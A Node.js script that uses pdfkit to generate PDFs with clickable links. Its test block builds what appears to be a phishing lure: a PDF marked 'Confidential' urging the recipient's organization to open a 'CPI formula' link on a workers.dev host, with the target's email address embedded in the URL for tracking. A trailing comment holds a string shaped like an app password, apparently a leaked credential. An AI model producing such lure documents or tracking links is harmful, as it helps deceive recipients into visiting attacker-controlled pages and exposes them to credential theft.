const PDFDocument = require('pdfkit');
const fs = require('fs');
const path = require('path');
const { finished } = require('stream/promises');

/**
 * Function to create a PDF with a heading, body, links, and footer and return it as an object
 * @param {string} heading - The heading of the PDF
 * @param {string} body - The body text of the PDF
 * @param {Array} linksObjects - Array of objects with {text, link} for clickable links
 * @param {string} footer - The footer text of the PDF
 * @returns {Promise<Buffer>} - Resolves with the PDF content as a Buffer
 */
async function createPDFObject(heading, body, linksObjects, footer) {
    const doc = new PDFDocument();
    let buffers = [];

    // Capture the PDF content into buffers
    doc.on('data', buffers.push.bind(buffers));

    // Add heading
    if (heading) {
        doc.fontSize(20).text(heading, { align: 'center', underline: true });
    }

    // Add body text
    if (body) {
        doc.moveDown().fontSize(14).text(body, { align: 'left' });
    }

    // Add clickable links
    if (Array.isArray(linksObjects) && linksObjects.length > 0) {
        doc.moveDown();
        linksObjects.forEach(({ text, link }) => {
            doc.fontSize(12).text(text, {
                link: link,
                underline: true,
                color: 'blue'
            });
            doc.moveDown(0.5);
        });
    }

    // Add footer
    if (footer) {
        doc.moveDown(2).fontSize(10).text(footer, { align: 'center' });
    }

    // Finalize the PDF
    doc.end();

    // Return the PDF content as a buffer
    return new Promise((resolve, reject) => {
        doc.on('end', () => {
            const pdfBuffer = Buffer.concat(buffers);
            resolve(pdfBuffer);
        });
        doc.on('error', reject);
    });
}

/**
 * Function to save PDF buffer to a file
 * @param {Buffer} pdfBuffer - The PDF content as a buffer
 * @param {string} outputFilePath - The file path where the PDF should be saved
 * @returns {Promise<string>} - Resolves with the file path when PDF is successfully saved
 */
async function savePDFToFile(pdfBuffer, outputFilePath) {
    const writeStream = fs.createWriteStream(outputFilePath);
    writeStream.write(pdfBuffer);
    writeStream.end();

    // Await the stream to finish
    await finished(writeStream);

    return outputFilePath;
}


// Test call if this script is run directly
if (require.main === module) {
    let email_addr = "abc1@def.com";
    (async () => {
        try {
            const heading = 'Confidential';
            const body = 'You organization has been suggested to utilize the formula available at following link';
            const linksObjects = [
                { text: 'CPI formula', link: `https://cloudflare.mughal.workers.dev/ograh/official?email=${email_addr}` }
            ];
            const footer = 'confidential';
            const outputFilePath = path.join(__dirname, 'ograh_official.pdf');

            // Generate the PDF for testing
            const pdfBuffer = await createPDFObject(heading, body, linksObjects, footer);
    
            const filePath = await savePDFToFile(pdfBuffer, outputFilePath);
            console.log(`Test PDF created at ${filePath}`);
        } catch (error) {
            console.error('Error creating test PDF:', error);
        }
    })();
}

// uqcl zccw hdnf mlgm
